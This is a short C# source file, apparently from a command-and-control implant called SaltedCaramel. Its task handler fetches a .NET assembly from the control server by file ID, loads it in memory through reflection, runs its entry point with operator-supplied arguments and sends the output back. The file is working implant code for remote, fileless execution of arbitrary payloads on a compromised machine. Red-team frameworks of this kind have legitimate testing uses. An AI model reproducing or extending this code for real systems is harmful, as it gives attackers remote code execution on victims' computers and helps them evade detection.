﻿using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Reflection = System.Reflection;

namespace SaltedCaramel.Tasks
{
    class Assembly
    {
        internal static void Execute(SCTask task, SCImplant implant)
        {
            JObject json = (JObject)JsonConvert.DeserializeObject(task.@params);
            string file_id = json.Value<string>("file_id");
            string[] args = json.Value<string[]>("args");
            byte[] assemblyBytes = Upload.GetFile(file_id, implant);
            Reflection.Assembly assembly = Reflection.Assembly.Load(assemblyBytes);
            string result = assembly.EntryPoint.Invoke(null, args).ToString();

            implant.PostResponse(new SCTaskResp(task.id, result));
            implant.SendComplete(task.id);
        }
    }
}
